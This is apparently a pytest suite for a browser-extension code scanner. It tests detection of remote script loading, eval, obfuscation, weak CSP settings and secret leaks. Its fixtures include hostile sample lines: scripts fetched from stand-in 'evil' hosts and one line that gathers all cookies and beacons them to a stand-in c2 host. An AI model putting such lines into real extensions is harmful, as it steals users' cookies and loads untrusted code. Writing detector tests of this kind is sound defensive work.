from pathlib import Path

from extanalyze.analysis.code_review import MAX_FILE_BYTES, review_directory


def _scan(tmp_path: Path, files: dict[str, str]):
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return review_directory(tmp_path, list(files))


def _ids(result):
    return {f.rule_id for f in result.findings}


def test_clean_extension_has_no_findings(tmp_path):
    r = _scan(tmp_path, {"bg.js": "chrome.runtime.onInstalled.addListener(() => {});"})
    assert r.findings == [] and r.exfil_flows == []
    assert r.files_scanned == 1


def test_dynamic_loading_detected(tmp_path):
    r = _scan(
        tmp_path,
        {
            "sw.js": "importScripts('https://evil.example.net/payload.js');\neval(atob(x));",
            "page.html": '<html><script src="https://cdn.evil.test/a.js"></script></html>',
        },
    )
    assert {"CR-DYN-001", "CR-DYN-003", "CR-DYN-006"} <= _ids(r)
    assert "cdn.evil.test" in r.external_domains
    assert "evil.example.net" in r.external_domains


def test_html_only_rule_ignores_js_files(tmp_path):
    r = _scan(tmp_path, {"a.js": 'const s = "<script src=\\"https://x.test/a.js\\">";'})
    assert "CR-DYN-006" not in _ids(r)


def test_inline_html_script_is_scanned(tmp_path):
    r = _scan(tmp_path, {"p.html": "<script>eval('1+1')</script>"})
    assert "CR-DYN-001" in _ids(r)


def test_exfil_flow_requires_access_and_channel(tmp_path):
    flow = _scan(
        tmp_path,
        {
            "c.js": (
                "chrome.cookies.getAll({}, c => navigator.sendBeacon('https://c2.test/x', JSON.stringify(c)));"
            )
        },
    )
    assert flow.exfil_flows == ["c.js"]
    only_channel = _scan(
        tmp_path / "b", {"c.js": "navigator.sendBeacon('https://t.test', 'ping');"}
    )
    assert only_channel.exfil_flows == []


def test_obfuscation_detected(tmp_path):
    r = _scan(
        tmp_path,
        {"o.js": "var _0x1a2b=['a'];" + "String.fromCharCode(" + ",".join(["65"] * 8) + ")"},
    )
    assert {"CR-OBF-001", "CR-OBF-003"} <= _ids(r)


def test_findings_are_deduplicated_with_count_and_location_cap(tmp_path):
    r = _scan(tmp_path, {"a.js": "\n".join(["eval(x);"] * 10)})
    f = next(f for f in r.findings if f.rule_id == "CR-DYN-001")
    assert f.count == 10 and len(f.locations) <= 3 and f.locations[0].line == 1


def test_snippet_strips_control_characters(tmp_path):
    r = _scan(tmp_path, {"a.js": "eval(\x1b[31m'x')"})
    snip = r.findings[0].locations[0].snippet
    assert "\x1b" not in snip


def test_oversized_file_skipped(tmp_path):
    big = tmp_path / "big.js"
    big.write_text("a" * (MAX_FILE_BYTES + 1))
    r = review_directory(tmp_path, ["big.js"])
    assert r.files_scanned == 0 and len(r.files_skipped) == 1


def test_symlink_and_traversal_ignored(tmp_path):
    outside = tmp_path / "outside.js"
    outside.write_text("eval(1)")
    base = tmp_path / "ext"
    base.mkdir()
    (base / "link.js").symlink_to(outside)
    r = review_directory(base, ["link.js", "../outside.js"])
    assert r.files_scanned == 0


def test_no_catastrophic_backtracking(tmp_path):
    import time

    payload = "fetch(" + "(" * 200000
    t = time.time()
    _scan(tmp_path, {"hostile.js": payload + "importScripts(" * 5000})
    assert time.time() - t < 5


def test_secrets_are_redacted_in_snippets(tmp_path):
    r = _scan(tmp_path, {"a.js": "const apiKey = 'abcdefghijklmnopqrstuvwxyz123456';"})
    f = next(f for f in r.findings if f.rule_id == "CR-SEC-001")
    assert f.locations[0].snippet == "[redacted]"


def test_vendor_dirs_only_run_high_severity_rules(tmp_path):
    r = _scan(
        tmp_path,
        {
            "lib/jquery.js": "eval(x);",  # MEDIUM: skipped in vendor dirs
            "vendor/evil.js": "importScripts('https://evil.test/x.js');",  # HIGH: still caught
        },
    )
    assert _ids(r) == {"CR-DYN-003"}


def test_csp_findings(tmp_path):
    (tmp_path / "a.js").write_text("1;")
    r = review_directory(
        tmp_path,
        ["a.js"],
        csp="script-src 'self' 'unsafe-eval' https://x.test *",
        manifest_version=2,
    )
    assert {"CR-CSP-002", "CR-CSP-004"} <= _ids(r)
    missing = review_directory(tmp_path, ["a.js"], csp=None, manifest_version=2)
    assert "CR-CSP-001" in _ids(missing)
    assert "CR-CSP-001" not in _ids(
        review_directory(tmp_path, ["a.js"], csp=None, manifest_version=3)
    )


def test_intel_extraction_skips_private_ips(tmp_path):
    r = _scan(tmp_path, {"a.js": "var a='8.8.4.4', b='192.168.1.1', c='127.0.0.1';"})
    assert [i["address"] for i in r.ips] == ["8.8.4.4"]


def test_hostile_new_rules_are_fast(tmp_path):
    import time

    payload = "document.write(" * 20000 + "setInterval(" * 20000 + "fetch(" * 20000
    t = time.time()
    _scan(tmp_path, {"h.js": payload})
    assert time.time() - t < 5
